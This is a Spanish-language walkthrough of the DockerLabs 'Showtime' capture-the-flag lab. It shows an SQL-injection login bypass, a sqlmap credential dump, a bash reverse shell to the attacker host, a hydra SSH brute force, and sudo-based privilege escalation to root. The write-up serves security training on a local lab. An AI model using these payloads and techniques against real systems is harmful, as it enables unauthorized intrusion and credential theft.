# Máquina Showtime

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/0L9nEQIT#W7C_nzun175xroRrKYOTcydum374ML-n24SANP_-k3w)

![imagen](https://github.com/user-attachments/assets/255ab84b-eead-4e8d-bf66-1d9cf141cb4d)

- **Nombre de la Máquina:** Showtime
- **Sistema Operativo:** Linux
- **Dificultad:** Easy
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - SQL Inyecction.
- **Escalada de Privilegios:**
  - sudo posh.
  - editar script para ejecutarlo con permisos de root.

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/52c7e636-597d-42a8-be62-e96da99e1743)

Nos muestra que los puertos 22 y 80 están abiertos. Realizamos un análisis más detallado para determinar qué servicios se están ejecutándose en los puertos.

```bash
sudo nmap -p 22,80 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/3e17f0c6-6c17-4b06-9f9c-541aa86dd023)

### Puerto 80 HTTP
Lanzamos un `whatweb` para ver que servicios corren en el http.

![imagen](https://github.com/user-attachments/assets/f3d42ff2-0ba2-4276-aef2-c58fa62e0fc3)

Parece ser un casino y vemos un botón de login.

![imagen](https://github.com/user-attachments/assets/1f6fa792-d911-43a0-8615-a67b08d26439)

Al pulsar me redirecciona al directorio `/login_page/` en donde encontramos un formulario para inciar sesión. Probé las típicas credenciales pero no servían.

![imagen](https://github.com/user-attachments/assets/cd7fcb27-d853-4969-b866-f13e0abe59ad)

Quise probar una inyección básica de sql y funcionó, pude iniciar sesión.
```sqli
admin' or '1'='1'-- -
```

![imagen](https://github.com/user-attachments/assets/1a9dc8a5-1081-484c-b9c3-00bd2bf7bbb3)

![imagen](https://github.com/user-attachments/assets/e0dcd49f-2652-4d8d-bfbf-6854532172c3)

Voy a usar **sqlmap** para dumpear los datos de los usuarios y las contraseñas. Primero con burpsuite nos descargamos la petición.

![imagen](https://github.com/user-attachments/assets/94c96e29-41ed-43a7-be9b-89a5b425943d)


```bash
sqlmap -r req --dbs --batch
```

![imagen](https://github.com/user-attachments/assets/7bdb0b3d-d75e-49e4-8747-ee6aeb621417)

Ahora que sabemos las bases de datos, veremos la información que existe dentro de users.

```bash
sqlmap -r req --dbs --batch -D 'users' --dump
```

![imagen](https://github.com/user-attachments/assets/24c0d272-b631-4894-a407-7726ab806190)

Pues observamos que dentro de la base de datos `users` existen tres usuarios con sus contraseñas.
Probamos las credenciales en la web y la única diferente es la del usuario `joe`, con este usuario autenticado podremos ejeuctar comandos con python.

![imagen](https://github.com/user-attachments/assets/5dfb52a8-968f-4dfd-9115-1e4ed285edfa)

Hago una prueba escribiendo lo siguiente y me lista los archivos de la ruta en la que estoy actualmente.

```python
import os
os.system("ls")
```

![imagen](https://github.com/user-attachments/assets/3a8319fe-7606-4883-93f9-4f13da7ab9b6)

Pues efectivamente ejecuta comandos, así que podremos ejecutarnos una reverse shell con el siguiente comando:

```python
import os
os.system("bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'")
```

Y en nuestra máquina atacante.

```bash
nc -nlvp 443
```

![imagen](https://github.com/user-attachments/assets/79106dd7-af53-4d72-85bf-d00a15aed97b)

Pues ejecutando el comando ya tendriamos nuestra reverse shell lista.

![imagen](https://github.com/user-attachments/assets/8298464b-2697-42c5-9c7e-ce1fc4596776)

## Escalada a usuario luciano
Estuve mucho tiempo buscando y rascando información hasta que encontré un archivo oculto en el directorio `/tmp`, todo es a partir de querer pasarme el script **linpeas.sh** para ver opciones más claras y justo encuentro ese archivo.

![imagen](https://github.com/user-attachments/assets/1d1ab7f9-a628-4754-be08-ba7d7fdf556a)

Al parecer es una lista de contraseñas, podríamos probar fuerza bruta en este punto a algunos de los usuarios usando hydra.

```bash
cat .hidden_text.txt 
Martin, esta es mi lista de mis trucos favoritos de gta sa:


HESOYAM
UZUMYMW
JUMPJET
LXGIWYL
KJKSZPJ
YECGAA
SZCMAWO
ROCKETMAN
AIWPRTON
OLDSPEEDDEMON
CPKTNWT
WORSHIPME
NATURALTALENT
BUFFMEUP
AEZAKMI
BRINGITON
FULLCLIP
CVWKXAM
OUIQDMW
PROFESSIONALSKIT
PROFESSIONALTOOLS
NINJATOWN
STINGLIKEABEE
GHOSTTOWN
BLUESUEDESHOES
SPEEDITUP
SLOWITDOWN
SLOWITDOWNBRO
BAGUVIX
CJPHONEHOME
SPEEDFREAK
BUBBLECARS
KANGAROO
CRAZYTOWN
EVERYONEISRICH
EVERYONEISPOOR
CHITTYCHITTYBANGBANG
FLYINGTOSTUNT
FLYINGFISH
MONSTERMASH
BIFBUZZ
WHEELSONLYPLEASE
SLOWMO
SPECIALK
JUMPJET
FLYINGTOSTUNT
FLYINGFISH
ASNAEB
BTCDBCB
KVGYZQK
HELLOLADIES
BGLUAWML
OSRBLHH
LJSPQK
VKYPQCF
SZCMAWO
ROCKETMAN
AIWPRTON
OLDSPEEDDEMON
CPKTNWT
WORSHIPME
NATURALTALENT
BUFFMEUP
BRINGITON
FULLCLIP
CVWKXAM
OUIQDMW
PROFESSIONALSKIT
PROFESSIONALTOOLS
NINJATOWN
STINGLIKEABEE
GHOSTTOWN
SPEEDITUP
SLOWITDOWN
SLOWITDOWNBRO
BAGUVIX
SPEEDFREAK
BUBBLECARS
```

Lo que haremos será copiarnos y pegarnos el siguiente archivo en nuestra máquina atacante pero solo las contraseñas, después con un `pipe` haremos que las mayúsculas se conviertan en minúsculas y seguidamente lo guardamos en un nuevo archivo de texto.

```bash
cat pass.txt | tr '[:upper:]' '[:lower:]' > pass_final.txt
```

![imagen](https://github.com/user-attachments/assets/4dbf1cc0-fa29-44a0-9027-90f397bef8eb)

Probé con el usuario luciano pero no encontró la contraseña así que probamos con `joe`.

```bash
hydra -l joe -P pass_final.txt ssh://172.17.0.2 -t 20 -V -I
```

![imagen](https://github.com/user-attachments/assets/660fdbc6-c1b1-4a21-b272-c9e15c2acb50)

Encontró la contraseña del usuario:
  - joe
  - chittychittybangbang

## Escalada a luciano
Introducimos las credenciales vía ssh y podremos iniciar sesión sin problemas.

![imagen](https://github.com/user-attachments/assets/a0c7729d-5b46-4509-8690-945dd33b6383)

Ejecutaremos `sudo -l` y podremos ejecutar el binario `/bin/posh` como el usuario `luciano`.

![imagen](https://github.com/user-attachments/assets/e312c902-5519-45b1-a5c2-2ec62d239482)

Mirando en [GTFOBins](https://gtfobins.github.io/gtfobins/posh/#sudo) podremos encontrar la manera de cambiarnos de usuario por el cuál ejecute el comando, en este caso `luciano`.

![imagen](https://github.com/user-attachments/assets/23915c9a-761e-48b9-bf15-e9f43923674b)

## Escalada de privilegios a root
Ejecutaremos otra vez `sudo -l` para ver que podemos ejecutar como root y nos saldrá lo siguiente:

![imagen](https://github.com/user-attachments/assets/56ecb185-9910-45a7-9d69-774759a1c347)

Podremos ejecutar el script que existe en nuestro directorio como el usuario `root`.

![imagen](https://github.com/user-attachments/assets/f26dbb2c-c83b-4b74-af86-bc22c4d5990f)

Tendremos permisos de lectura y escritura pero no he encontrado la manera de editar el archivo ya que este sistema no tiene ningún editor de textos instalado así que mi idea fué ejecutar un comando `echo` para sustituir el texto del script.

![imagen](https://github.com/user-attachments/assets/0d9dd32b-a11e-4c13-96ba-b02320e61e35)

```bash
echo '#!/bin/bash

bash -p' > script.sh
```

![imagen](https://github.com/user-attachments/assets/3a416620-4975-4596-b9c2-c2bf1cfe8604)

Existen muchas maneras de editar el archivo sin necesidad de un editor de textos y esta es una de ellas.

Ahora tan solo nos quedaría ejecutar el script como el usuario root y ya nos habremos convertido en usuario root.

```bash
sudo /bin/bash /home/luciano/script.sh
```

![imagen](https://github.com/user-attachments/assets/7330b5e5-eb35-41a3-9dba-f71aa75ebae4)
